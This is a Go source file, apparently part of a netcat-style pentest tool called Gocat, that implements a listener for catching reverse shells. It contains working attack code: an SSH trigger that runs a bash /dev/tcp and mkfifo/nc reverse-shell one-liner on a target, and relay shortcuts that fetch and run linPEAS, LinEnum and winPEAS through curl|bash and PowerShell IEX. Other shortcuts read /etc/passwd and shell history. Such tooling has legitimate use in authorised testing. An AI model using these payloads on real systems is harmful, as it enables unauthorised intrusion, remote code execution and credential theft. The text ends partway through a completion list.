package cmd

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/creack/pty"
	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/network"
	"github.com/realibrahimsql/Gocat/internal/readline"
	"github.com/realibrahimsql/Gocat/internal/session"
	"github.com/realibrahimsql/Gocat/internal/shell"
	"github.com/realibrahimsql/Gocat/internal/signals"
	"github.com/realibrahimsql/Gocat/internal/terminal"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

var (
	interactive     bool
	blockSignals    bool
	localOnly       bool
	execCommand     string
	bindAddress     string
	listenKeepAlive bool
	maxConnections  int
	listenTimeout   time.Duration
	listenUseUDP    bool
	listenUseSCTP   bool
	listenForceIPv6 bool
	listenForceIPv4 bool
	listenUseSSL    bool
	sslKeyFile      string
	sslCertFile     string
	// Global flags for listen (assigned from persistent flags)
	listenSendOnly     bool
	listenRecvOnly     bool
	listenOutputFile   string
	listenHexDumpFile  string
	listenAppendOutput bool
	listenNoShutdown   bool
	// Access control flags
	allowList []string
	denyList  []string
	allowFile string
	denyFile  string
	// Protocol flags for listen
	listenTelnetMode bool
	listenCRLFMode   bool
	listenZeroIOMode bool
	// Session management flags
	listenSessionMode  bool
	listenAutoUpgrade  bool
	listenNoAttach     bool
	listenMaintain     int
	listenPayloads     bool
	listenIface        string
	listenSingle       bool
	listenSSHTrigger   string
	listenSSHStrictKey bool
	listenMaxSessions  int
)

// foregroundMu guarantees a single stdin owner across concurrent
// connections. Without it, every accepted connection starts its own line
// editor on os.Stdin and they garble each other's rendering.
var foregroundMu sync.Mutex

var listenCmd = &cobra.Command{
	Use:     "listen [host] <port>",
	Aliases: []string{"l"},
	Short:   "Start a listener for incoming connections",
	Long: `Start a TCP listener on the specified port and optionally host.

In relay mode, operator shortcuts are intercepted locally instead of
being sent to the remote shell:
  shell/bash/zsh  Upgrade to an interactive PTY shell
  linpeas/linenum Fetch and run remote enumerators (Linux)
  winpeas         Fetch and run winPEAS (Windows)
  sysinfo         Kernel, identity and working directory
  suid            SUID binaries; caps: capabilities
  cron            Cron jobs; users: /etc/passwd; hist: shell history`,
	Args: cobra.RangeArgs(1, 2),
	Run:  runListen,
}

func init() {
	rootCmd.AddCommand(listenCmd)

	listenCmd.Flags().BoolVar(&interactive, "interactive", false, "Interactive mode")
	listenCmd.Flags().BoolVar(&blockSignals, "block-signals", false, "Block exit signals like CTRL-C")
	listenCmd.Flags().BoolVar(&localOnly, "local", false, "Local interactive mode")
	listenCmd.Flags().StringVar(&execCommand, "listen-exec", "", "Execute command for each connection")
	listenCmd.Flags().StringVar(&bindAddress, "bind", "0.0.0.0", "Bind to specific address")
	listenCmd.Flags().BoolVar(&listenKeepAlive, "listen-keep-alive", false, "Keep connections alive")
	listenCmd.Flags().IntVar(&maxConnections, "listen-max-conn", 10, "Maximum concurrent connections")
	listenCmd.Flags().DurationVar(&listenTimeout, "listen-timeout", 0, "Connection timeout (0 = no timeout)")
	listenCmd.Flags().BoolVar(&listenUseUDP, "listen-udp", false, "Use UDP instead of TCP")
	listenCmd.Flags().BoolVar(&listenForceIPv6, "listen-ipv6", false, "Force IPv6")
	listenCmd.Flags().BoolVar(&listenForceIPv4, "listen-ipv4", false, "Force IPv4")
	listenCmd.Flags().BoolVar(&listenUseSSL, "listen-ssl", false, "Use SSL/TLS")
	listenCmd.Flags().StringVar(&sslKeyFile, "listen-ssl-key", "", "SSL private key file")
	listenCmd.Flags().StringVar(&sslCertFile, "listen-ssl-cert", "", "SSL certificate file")

	// Session management flags
	listenCmd.Flags().BoolVar(&listenSessionMode, "session", false, "Enable session management")
	listenCmd.Flags().BoolVar(&listenAutoUpgrade, "auto-upgrade", true, "Auto-upgrade shells to PTY")
	listenCmd.Flags().BoolVar(&listenNoAttach, "no-attach", false, "Do not auto-attach new sessions")
	listenCmd.Flags().IntVar(&listenMaintain, "maintain", 1, "Keep N sessions per target")
	listenCmd.Flags().BoolVar(&listenPayloads, "payloads", false, "Show reverse shell payloads after listening")
	listenCmd.Flags().StringVar(&listenIface, "iface", "", "Resolve bind address from network interface (e.g. eth0, tun0)")
	listenCmd.Flags().BoolVar(&listenSingle, "single-session", false, "Stop listener after the first session (session mode only)")
	listenCmd.Flags().IntVar(&listenMaxSessions, "max-sessions", 5, "Max active sessions per host (0 rejects new, -1 disables)")
	listenCmd.Flags().StringVar(&listenSSHTrigger, "ssh-trigger", "", "SSH to user@host and trigger a callback shell (e.g. user@target)")
	listenCmd.Flags().BoolVar(&listenSSHStrictKey, "ssh-strict-host-key", true, "Enforce SSH host key checking for --ssh-trigger")

	// Mark conflicting flags
	listenCmd.MarkFlagsMutuallyExclusive("interactive", "local")
	listenCmd.MarkFlagsMutuallyExclusive("listen-ipv4", "listen-ipv6")
}

func runListen(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 1 {
		host = bindAddress
		port = args[0]
	} else {
		host = args[0]
		port = args[1]
	}

	// Resolve bind address from a network interface when --iface is given
	if listenIface != "" {
		if ip := getInterfaceIP(listenIface); ip != "" {
			host = ip
		} else {
			logger.Fatal("Cannot resolve interface %q to an IP address", listenIface)
		}
	}

	// Override local flags with global flags if set
	if globalSSL, _ := cmd.Root().PersistentFlags().GetBool("ssl"); globalSSL {
		listenUseSSL = true
	}
	if globalUDP, _ := cmd.Root().PersistentFlags().GetBool("udp"); globalUDP {
		listenUseUDP = true
	}
	if globalIPv4, _ := cmd.Root().PersistentFlags().GetBool("ipv4"); globalIPv4 {
		listenForceIPv4 = true
	}
	if globalIPv6, _ := cmd.Root().PersistentFlags().GetBool("ipv6"); globalIPv6 {
		listenForceIPv6 = true
	}
	if globalSCTP, _ := cmd.Root().PersistentFlags().GetBool("sctp"); globalSCTP {
		listenUseSCTP = true
	}
	if globalMaxConns, _ := cmd.Root().PersistentFlags().GetInt("max-conns"); globalMaxConns > 0 {
		maxConnections = globalMaxConns
	}
	if globalSSLCert, _ := cmd.Root().PersistentFlags().GetString("ssl-cert"); globalSSLCert != "" {
		sslCertFile = globalSSLCert
	}
	if globalSSLKey, _ := cmd.Root().PersistentFlags().GetString("ssl-key"); globalSSLKey != "" {
		sslKeyFile = globalSSLKey
	}
	// Data flow control flags for listen
	if globalSendOnly, _ := cmd.Root().PersistentFlags().GetBool("send-only"); globalSendOnly {
		listenSendOnly = true
	}
	if globalRecvOnly, _ := cmd.Root().PersistentFlags().GetBool("recv-only"); globalRecvOnly {
		listenRecvOnly = true
	}
	if globalNoShutdown, _ := cmd.Root().PersistentFlags().GetBool("no-shutdown"); globalNoShutdown {
		listenNoShutdown = true
	}
	// Output flags for listen
	if globalOutput, _ := cmd.Root().PersistentFlags().GetString("output"); globalOutput != "" {
		listenOutputFile = globalOutput
	}
	if globalHexDump, _ := cmd.Root().PersistentFlags().GetString("hex-dump"); globalHexDump != "" {
		listenHexDumpFile = globalHexDump
	}
	if globalAppend, _ := cmd.Root().PersistentFlags().GetBool("append-output"); globalAppend {
		listenAppendOutput = true
	}
	// Execution flags for listen
	if globalExec, _ := cmd.Root().PersistentFlags().GetString("exec"); globalExec != "" {
		execCommand = globalExec
	}
	if globalShExec, _ := cmd.Root().PersistentFlags().GetString("sh-exec"); globalShExec != "" {
		execCommand = "/bin/sh -c " + session.ShellQuote(globalShExec)
	}
	// Access control flags
	if globalAllow, _ := cmd.Root().PersistentFlags().GetStringSlice("allow"); len(globalAllow) > 0 {
		allowList = globalAllow
	}
	if globalDeny, _ := cmd.Root().PersistentFlags().GetStringSlice("deny"); len(globalDeny) > 0 {
		denyList = globalDeny
	}
	if globalAllowFile, _ := cmd.Root().PersistentFlags().GetString("allowfile"); globalAllowFile != "" {
		allowFile = globalAllowFile
	}
	if globalDenyFile, _ := cmd.Root().PersistentFlags().GetString("denyfile"); globalDenyFile != "" {
		denyFile = globalDenyFile
	}
	// Protocol flags for listen
	if globalTelnet, _ := cmd.Root().PersistentFlags().GetBool("telnet"); globalTelnet {
		listenTelnetMode = true
	}
	if globalCRLF, _ := cmd.Root().PersistentFlags().GetBool("crlf"); globalCRLF {
		listenCRLFMode = true
	}
	if globalZeroIO, _ := cmd.Root().PersistentFlags().GetBool("zero-io"); globalZeroIO {
		listenZeroIOMode = true
	}

	// Show payloads if requested
	if listenPayloads {
		listenHost := host
		if listenHost == "0.0.0.0" || listenHost == "" {
			listenHost = getDefaultIP()
		}
		fmt.Println()
		payloads := generatePayloads(listenHost, port)
		theme := logger.GetCurrentTheme()
		for _, p := range payloads {
			printPayload(p, theme)
		}
	}

	// Configure session manager if session mode is enabled
	if listenSessionMode {
		session.DefaultManager.NoUpgrade = !listenAutoUpgrade
		session.DefaultManager.NoAttach = listenNoAttach
		session.DefaultManager.Maintain = listenMaintain
		session.DefaultManager.MaxSessions = listenMaxSessions
		session.DefaultManager.SingleSession = listenSingle

		portInt, _ := strconv.Atoi(port)
		listenerID := session.DefaultManager.AddListener(host, portInt)
		logger.Info("Registered listener [%d] on %s:%s (session mode)", listenerID, host, port)
	} else if listenSingle {
		logger.Warn("--single-session has no effect without session mode; ignoring")
	}

	if listenSSHTrigger != "" {
		go triggerSSHCallback(listenSSHTrigger, host, port)
	}

	if err := listen(host, port); err != nil {
		logger.Fatal("Error: %v", err)
	}
}

func listen(host, port string) error {
	address := net.JoinHostPort(host, port)

	// Determine network type
	network := "tcp"
	if listenUseUDP {
		network = "udp"
	} else if listenUseSCTP {
		network = "sctp"
	}
	if listenForceIPv6 {
		network += "6"
	} else if listenForceIPv4 {
		network += "4"
	}

	logger.Debug("Listening on %s using %s protocol", address, network)
	if listenUseSSL {
		logger.Debug("SSL/TLS enabled for listening")
	}
	logger.Debug("Maximum connections: %d", maxConnections)

	var listener net.Listener
	var err error

	// Handle SCTP separately
	if listenUseSCTP {
		return handleSCTPListener(network, address)
	}

	// Handle SSL/TLS
	if listenUseSSL {
		listener, err = createTLSListener(network, address)
	} else if listenUseUDP {
		return handleUDPListener(network, address)
	} else {
		listener, err = net.Listen(network, address)
	}

	if err != nil {
		return fmt.Errorf("failed to bind to %s: %v", address, err)
	}
	defer func() {
		if err := listener.Close(); err != nil {
			logger.Debug("Listener close: %v", err)
		}
	}()

	theme := logger.GetCurrentTheme()
	if _, err := theme.Success.Printf("Listening on %s\n", address); err != nil {
		logger.Error("Error printing success message: %v", err)
	}

	// Handle zero-I/O mode - just test listen capability and exit
	if listenZeroIOMode {
		logger.Info("Zero-I/O mode: Listener bound successfully, no connections accepted")
		return nil
	}

	// Handle multiple connections with semaphore
	connSemaphore := make(chan struct{}, maxConnections)
	var wg sync.WaitGroup

	singleSession := listenSessionMode && listenSingle
	accepted := 0

	for {
		conn, err := listener.Accept()
		if err != nil {
			if singleSession {
				return nil
			}
			logger.Error("Failed to accept connection: %v", err)
			continue
		}

		// Raw mode shares a single stdin/stdout: concurrent connections
		// would split keystrokes and interleave output into garbage, so
		// handle them one at a time (netcat semantics). Session mode
		// multiplexes properly and keeps the concurrent path.
		if !listenSessionMode {
			logger.Info("Handling connection from %s (raw mode: one at a time)", conn.RemoteAddr())
			handleConnection(conn)
			if err := conn.Close(); err != nil {
				logger.Debug("Connection close: %v", err)
			}
			continue
		}

		// Acquire semaphore slot
		connSemaphore <- struct{}{}
		wg.Add(1)

		go func(c net.Conn) {
			defer func() {
				if err := c.Close(); err != nil {
					logger.Error("Error closing connection: %v", err)
				}
				<-connSemaphore // Release semaphore slot
				wg.Done()
			}()

			handleConnection(c)
		}(conn)

		// Single-session mode: stop the listener after the first session,
		// then block until that session ends.
		if singleSession {
			accepted++
			if accepted >= 1 {
				logger.Info("Single-session mode: listener closed after first session")
				if err := listener.Close(); err != nil {
					logger.Debug("Listener close: %v", err)
				}
				wg.Wait()
				return nil
			}
		}
	}
}

func createTLSListener(network, address string) (net.Listener, error) {
	// No cert/key given: generate an ephemeral self-signed certificate instead of failing.
	if sslCertFile == "" || sslKeyFile == "" {
		logger.Warn("No SSL certificate/key given; generating an ephemeral self-signed certificate")
		cert, err := generateSelfSignedCert(address)
		if err != nil {
			return nil, fmt.Errorf("failed to generate self-signed certificate: %v", err)
		}
		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		return tls.Listen(network, address, tlsConfig)
	}

	cert, err := tls.LoadX509KeyPair(sslCertFile, sslKeyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load SSL certificate: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12, // Secure minimum TLS version
	}

	return tls.Listen(network, address, tlsConfig)
}

// generateSelfSignedCert creates an ephemeral self-signed TLS certificate for
// listeners started without --listen-ssl-cert/--listen-ssl-key. The key never
// touches disk; it lives only for the process lifetime.
func generateSelfSignedCert(address string) (tls.Certificate, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	host, _, err := net.SplitHostPort(address)
	if err != nil {
		host = address
	}

	template := x509.Certificate{
		SerialNumber: mustRandomSerial(),
		Subject: pkix.Name{
			CommonName:   "gocat",
			Organization: []string{"gocat"},
		},
		NotBefore:             time.Now().Add(-5 * time.Minute),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost"},
	}
	if ip := net.ParseIP(host); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else if host != "" {
		template.DNSNames = append(template.DNSNames, host)
	}

	der, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})

	return tls.X509KeyPair(certPEM, keyPEM)
}

// mustRandomSerial returns a random 128-bit certificate serial number.
func mustRandomSerial() *big.Int {
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return big.NewInt(time.Now().UnixNano())
	}
	return serial
}

// triggerSSHCallback SSHes to target and runs a reverse-shell one-liner there
// that calls back to this listener.
func triggerSSHCallback(target, listenHost, listenPort string) {
	callbackHost := listenHost
	if callbackHost == "" || callbackHost == "0.0.0.0" || callbackHost == "::" {
		callbackHost = getDefaultIP()
	}

	// Bash first, mkfifo/nc fallback chained so one of them succeeds on typical minimal targets.
	payload := fmt.Sprintf(
		`(bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &); `+
			`(rm -f /tmp/gcfifo; mkfifo /tmp/gcfifo && nc %s %s 0</tmp/gcfifo | /bin/sh >/tmp/gcfifo 2>&1 &)`,
		callbackHost, listenPort, callbackHost, listenPort)

	strictKey := "yes"
	if !listenSSHStrictKey {
		strictKey = "no"
		logger.Warn("--ssh-trigger with host key checking disabled: MITM can steal the trigger")
	}
	cmd := exec.Command("ssh",
		"-o", "BatchMode=yes",
		"-o", "ConnectTimeout=10",
		"-o", "StrictHostKeyChecking="+strictKey,
		target, payload)

	logger.Info("SSH trigger: %s -> callback %s:%s", target, callbackHost, listenPort)
	if out, err := cmd.CombinedOutput(); err != nil {
		logger.Error("SSH trigger failed: %v (%s)", err, strings.TrimSpace(string(out)))
		return
	}
	logger.Info("SSH trigger command delivered to %s", target)
}

func handleUDPListener(network, address string) error {
	udpAddr, err := net.ResolveUDPAddr(network, address)
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %v", err)
	}

	udpConn, err := net.ListenUDP(network, udpAddr)
	if err != nil {
		return fmt.Errorf("failed to bind UDP: %v", err)
	}
	defer func() {
		if err := udpConn.Close(); err != nil {
			logger.Error("Error closing UDP connection: %v", err)
		}
	}()

	theme := logger.GetCurrentTheme()
	if _, err := theme.Success.Printf("Listening on %s (UDP)\n", address); err != nil {
		logger.Error("Error printing success message: %v", err)
	}

	buffer := make([]byte, 4096)
	for {
		n, clientAddr, err := udpConn.ReadFromUDP(buffer)
		if err != nil {
			logger.Error("UDP read error: %v", err)
			continue
		}

		theme := logger.GetCurrentTheme()
		if _, err := theme.Highlight.Printf("UDP packet from %s: %s\n", clientAddr, string(buffer[:n])); err != nil {
			logger.Error("Error printing highlight message: %v", err)
		}

		// Echo back for UDP
		if _, err := udpConn.WriteToUDP(buffer[:n], clientAddr); err != nil {
			logger.Error("UDP write error: %v", err)
		}
	}
}

func handleSCTPListener(netType, address string) error {
	// Check if SCTP is supported
	if !network.IsSCTPSupported() {
		return fmt.Errorf("SCTP protocol not supported on this platform")
	}

	// Parse SCTP address
	sctpAddr, err := network.ResolveSCTPAddr(netType, address)
	if err != nil {
		return fmt.Errorf("failed to resolve SCTP address: %w", err)
	}

	// Create SCTP listener
	listener, err := network.ListenSCTP(netType, sctpAddr, nil)
	if err != nil {
		return fmt.Errorf("failed to bind SCTP: %w", err)
	}
	defer func() {
		if err := listener.Close(); err != nil {
			logger.Error("Error closing SCTP listener: %v", err)
		}
	}()

	theme := logger.GetCurrentTheme()
	if _, err := theme.Success.Printf("Listening on %s (SCTP)\n", address); err != nil {
		logger.Error("Error printing success message: %v", err)
	}

	// Handle multiple connections with semaphore
	connSemaphore := make(chan struct{}, maxConnections)
	var wg sync.WaitGroup

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Error("Failed to accept SCTP connection: %v", err)
			continue
		}

		// Acquire semaphore slot
		connSemaphore <- struct{}{}
		wg.Add(1)

		go func(c net.Conn) {
			defer func() {
				if err := c.Close(); err != nil {
					logger.Error("Error closing SCTP connection: %v", err)
				}
				<-connSemaphore // Release semaphore slot
				wg.Done()
			}()

			handleConnection(c)
		}(conn)
	}
}

func handleConnection(conn net.Conn) {
	// Access control - check allow/deny lists
	remoteAddr := conn.RemoteAddr().String()
	remoteIP := strings.Split(remoteAddr, ":")[0] // Extract IP from "IP:port"

	// Check deny list first
	if isIPBlocked(remoteIP) {
		logger.Warn("Connection from %s denied by access control", remoteAddr)
		conn.Close()
		return
	}

	// Check allow list if specified
	if !isIPAllowed(remoteIP) {
		logger.Warn("Connection from %s not in allow list", remoteAddr)
		conn.Close()
		return
	}

	// Set connection timeout if specified
	if listenTimeout > 0 {
		if err := conn.SetDeadline(time.Now().Add(listenTimeout)); err != nil {
			logger.Error("Error setting deadline: %v", err)
		}
	}

	// Configure keep-alive for TCP connections
	if listenKeepAlive && !listenUseUDP {
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			if err := tcpConn.SetKeepAlive(true); err != nil {
				logger.Warn("Failed to enable keep-alive: %v", err)
			} else {
				if err := tcpConn.SetKeepAlivePeriod(30 * time.Second); err != nil {
					logger.Warn("Failed to set keep-alive period: %v", err)
				}
			}
		}
	}

	theme := logger.GetCurrentTheme()
	if _, err := theme.Highlight.Printf("Connection received from %s\n", conn.RemoteAddr()); err != nil {
		logger.Error("Error printing highlight message: %v", err)
	}

	// Session management mode
	if listenSessionMode {
		handleSessionConnection(conn)
		return
	}

	// Only one connection may own stdin. Extra concurrent connections run
	// output-only; otherwise their line editors fight over os.Stdin and the
	// terminal rendering compounds into garbage.
	if !foregroundMu.TryLock() {
		logger.Warn("Connection from %s is in the background (stdin is owned by another connection)", conn.RemoteAddr())
		if _, err := io.Copy(&relayWriter{inner: ttyCRLFWriter(os.Stdout)}, applyProtocolWrappers(conn)); err != nil {
			logger.Debug("Background connection ended: %v", err)
		}
		return
	}
	defer foregroundMu.Unlock()

	// Apply protocol wrappers if enabled
	finalConn := applyProtocolWrappers(conn)

	var err error
	if interactive {
		err = handleInteractive(finalConn)
	} else if localOnly {
		err = handleLocalInteractive(finalConn)
	} else {
		err = handleNormal(finalConn)
	}

	if err != nil {
		logger.Error("Connection handling error: %v", err)
	}
}

// ttyCRLFWriter wraps w with LF-to-CRLF conversion when w is an
// interactive terminal. Remote shells without a PTY send bare LF,
// which slides diagonally on terminals in raw mode.
func ttyCRLFWriter(w io.Writer) io.Writer {
	if f, ok := w.(*os.File); ok && term.IsTerminal(int(f.Fd())) {
		return &crlfWriter{writer: w}
	}
	return w
}

// noisePhrases are dropped from remote output. Interactive shells without
// a TTY print these job-control warnings on startup; they carry no signal.
var noisePhrases = []string{
	"cannot set terminal process group",
	"no job control in this shell",
}

// relayWriter routes remote output to the operator terminal: it drops
// known-noisy shell startup lines and, on interactive terminals, prints
// above the readline prompt so incoming bytes don't tear the typed line.
// A trailing partial line (e.g. a shell prompt) passes through untouched.
type relayWriter struct {
	ed      *readline.Editor
	inner   io.Writer
	pending []byte
}

func (w *relayWriter) Write(p []byte) (int, error) {
	if w.ed == nil || !term.IsTerminal(int(os.Stdout.Fd())) {
		if _, err := w.inner.Write(dropNoiseLines(p)); err != nil {
			return 0, err
		}
		return len(p), nil
	}
	w.pending = append(w.pending, p...)
	for {
		i := bytes.IndexByte(w.pending, '\n')
		if i < 0 {
			break
		}
		line := append([]byte(nil), w.pending[:i+1]...)
		w.pending = append([]byte(nil), w.pending[i+1:]...)
		if clean := dropNoiseLines(line); len(clean) > 0 {
			w.ed.SetRemotePrefix("")
			w.ed.PrintAbove(string(clean))
		}
	}
	w.ed.SetRemotePrefix(string(w.pending))
	return len(p), nil
}

// dropNoiseLines removes complete lines containing known noise phrases.
func dropNoiseLines(p []byte) []byte {
	var clean []byte
	start := 0
	for start < len(p) {
		i := bytes.IndexByte(p[start:], '\n')
		if i < 0 {
			clean = append(clean, p[start:]...)
			break
		}
		line := p[start : start+i+1]
		noisy := false
		for _, n := range noisePhrases {
			if bytes.Contains(line, []byte(n)) {
				noisy = true
				break
			}
		}
		if !noisy {
			clean = append(clean, line...)
		}
		start += i + 1
	}
	return clean
}

// splitHostPort extracts IP and port from a net.Addr without panicking on
// non-TCP addresses (TLS-wrapped, Unix, in-memory pipes, etc.).
func splitHostPort(addr net.Addr) (string, int) {
	if addr == nil {
		return "unknown", 0
	}
	if tcp, ok := addr.(*net.TCPAddr); ok && tcp != nil {
		ip := "unknown"
		if tcp.IP != nil {
			ip = tcp.IP.String()
		}
		return ip, tcp.Port
	}
	host, portStr, err := net.SplitHostPort(addr.String())
	if err != nil {
		return addr.String(), 0
	}
	port, _ := strconv.Atoi(portStr)
	return host, port
}

// handleSessionConnection creates and manages a session for an incoming connection
func handleSessionConnection(conn net.Conn) {
	remoteIP, remotePort := splitHostPort(conn.RemoteAddr())
	remote := conn.RemoteAddr().String()
	sess := session.NewSession(conn, remoteIP, remotePort, 0, session.SourceReverse)

	// Determine OS and shell type
	logger.Info("Determining shell type for %s...", remote)
	if !sess.Determine() {
		logger.Error("Failed to determine shell type for %s, dropping", remote)
		conn.Close()
		return
	}

	// Get system info
	sess.GetSystemInfo()
	sess.GetUser()
	sess.BuildName()

	// Register session (honors per-host --max-sessions cap)
	if session.DefaultManager.AddSession(sess) < 0 {
		conn.Close()
		return
	}

	// Get available binaries for Unix sessions
	if sess.OS == session.OSUnix {
		sess.GetBinaries()
		sess.FindTmpDir()
	}

	// Auto-upgrade if enabled
	if listenAutoUpgrade && sess.OS == session.OSUnix && sess.Type == session.ShellRaw {
		logger.Info("Attempting auto-upgrade for session [%d]...", sess.ID)
		result := shell.Upgrade(sess, shell.MethodAuto)
		if result.Success {
			logger.Info("Session [%d] upgraded to PTY via %s", sess.ID, result.Method)
			shell.SetShellEnvironment(sess)
		} else {
			logger.Warn("Auto-upgrade failed for session [%d]: %v", sess.ID, result.Error)
		}
	}

	// Auto-attach if no session is currently attached
	if !listenNoAttach && session.DefaultManager.AttachedSession == nil {
		go func(id int) {
			if err := session.DefaultManager.InteractSession(id); err != nil {
				logger.Error("Session interaction ended: %v", err)
			}
		}(sess.ID)
	}

	// Keep connection alive: read from the session and pipe to stdout if attached
	sess.PumpActive = true
	ttyOut := &relayWriter{inner: ttyCRLFWriter(os.Stdout)}
	buf := make([]byte, 16384)
	for {
		n, err := sess.Recv(buf)
		if err != nil {
			session.DefaultManager.RemoveSession(sess.ID)
			return
		}
		if n > 0 {
			sess.HandleOutput(buf[:n])
			if sess.IsAttached {
				ttyOut.Write(buf[:n])
			}
		}
	}
}

// relayShortcuts are operator commands intercepted locally in relay mode
// instead of being forwarded to the remote shell.
var relayShortcuts = map[string]string{
	// Upgrade the raw socket shell to an interactive PTY shell.
	"shell": `python3 -c 'import pty; pty.spawn("/bin/sh")'`,
	"bash":  `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
	"zsh":   `python3 -c 'import pty; pty.spawn("/bin/zsh")'`,
	// Fetch and run enumerators on the remote host.
	"linpeas": `curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash`,
	"linenum": `curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`,
	"winpeas": `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat')"`,
	// Quick local enumeration one-liners.
	"sysinfo": `uname -a && id && pwd`,
	"suid":    `find / -perm -4000 -type f 2>/dev/null`,
	"caps":    `getcap -r / 2>/dev/null | head -30`,
	"cron":    `ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null`,
	"users":   `cat /etc/passwd`,
	"hist":    `tail -50 ~/.bash_history 2>/dev/null`,
}

// runRelayShortcut handles one input line locally. It reports whether the
// line was consumed (true) or must be forwarded to the remote shell.
func runRelayShortcut(line string, conn net.Conn) bool {
	cmd, ok := relayShortcuts[strings.TrimSpace(line)]
	if !ok {
		return false
	}
	if _, err := conn.Write([]byte(cmd + "\n")); err != nil {
		logger.Error("Shortcut write failed: %v", err)
	}
	return true
}

func handleNormal(conn net.Conn) error {
	if blockSignals {
		signals.BlockExitSignals()
	}

	if execCommand != "" {
		if _, err := conn.Write([]byte(execCommand + "\n")); err != nil {
			return fmt.Errorf("failed to send exec command: %v", err)
		}
	}

	// Wrap stdout with CRLF if enabled
	var stdoutWriter io.Writer = os.Stdout
	if listenOutputFile != "" {
		file, err := openOutputFile(listenOutputFile, listenAppendOutput)
		if err != nil {
			return fmt.Errorf("failed to open output file: %v", err)
		}
		defer file.Close()
		stdoutWriter = file
	}
	if listenHexDumpFile != "" {
		hexFile, err := openOutputFile(listenHexDumpFile, listenAppendOutput)
		if err != nil {
			return fmt.Errorf("failed to open hex dump file: %v", err)
		}
		defer hexFile.Close()
		stdoutWriter = &hexDumper{writer: hexFile, original: stdoutWriter}
	}
	if listenCRLFMode {
		stdoutWriter = &crlfWriter{writer: stdoutWriter}
	} else {
		stdoutWriter = ttyCRLFWriter(stdoutWriter)
	}

	if listenSendOnly {
		_, err := io.Copy(conn, os.Stdin)
		if err != nil && !listenNoShutdown {
			return fmt.Errorf("send-only copy error: %v", err)
		}
		return nil
	}

	if listenRecvOnly {
		if _, err := io.Copy(stdoutWriter, conn); err != nil {
			return fmt.Errorf("recv-only copy error: %v", err)
		}
		return nil
	}

	// Done channel for clean shutdown
	done := make(chan struct{})
	var doneOnce sync.Once
	closeDone := func() {
		doneOnce.Do(func() { close(done) })
	}

	// Create readline editor - no prompt, but with full features
	editor := readline.NewEditor()
	editor.SetPrompt("") // No prompt - remote shell's prompt will show

	// Route connection output and logs above the prompt so neither tears
	// the line being typed. Restored when the connection ends.
	relayOut := &relayWriter{ed: editor, inner: stdoutWriter}

	// Goroutine: Read from connection and write to stdout
	go func() {
		io.Copy(relayOut, conn)
		closeDone()
	}()

	// Set history file
	if homeDir, err := os.UserHomeDir(); err == nil {
		editor.SetHistoryFile(homeDir + "/.gocat_history")
	}

	// Enable advanced features (no autosuggest: ghost text is never
	// submitted on Enter, so it misleads more than it helps)
	editor.EnableAutoSuggestion(false)
	editor.EnableBracketMatching(true)                           // Highlight matching brackets
	editor.SetIgnoreCase(true)                                   // Case-insensitive completion
	editor.SetSyntaxHighlighter(readline.ShellSyntaxHighlighter) // Syntax highlighting

	// Shell command completions
	completions := []string{
		// File operations
		"ls", "dir", "pwd", "cd", "mkdir", "rmdir", "rm", "cp", "mv", "cat", "echo",
		"touch", "head", "tail", "less", "more", "file", "stat", "ln", "readlink",
		// Search & text processing
		"grep", "egrep", "fgrep", "find", "locate", "which", "whereis", "type",
		"sed", "awk", "cut", "sort", "uniq", "wc", "tr", "xargs", "tee",
		// Process management
		"ps", "kill", "killall", "pkill", "pgrep", "top", "htop", "jobs", "fg", "bg",
		"nohup", "nice", "renice", "timeout", "watch",
		// System info
		"whoami", "id", "uname", "hostname", "uptime", "date", "cal", "df", "du",
		"free", "vmstat", "iostat", "lsof", "strace", "ltrace",
		// Network
		"ifconfig", "ip", "netstat", "ss", "ping", "traceroute", "tracepath",
		"curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "netcat", "nmap",
		"dig", "nslookup", "host", "whois", "arp", "route", "iptables",
		// Permissions
		"chmod", "chown", "chgrp", "umask", "getfacl", "setfacl",
		// Archives
		"tar", "gzip", "gunzip", "bzip2", "xz", "zip", "unzip", "7z", "rar",
		// Package managers
		"apt", "apt-get", "dpkg", "yum", "dnf", "rpm", "pacman", "brew", "snap",
		"pip", "pip3", "npm", "yarn", "gem", "cargo", "go",
		// Services
		"systemctl", "service", "journalctl", "dmesg", "crontab",
		// Shells & scripting
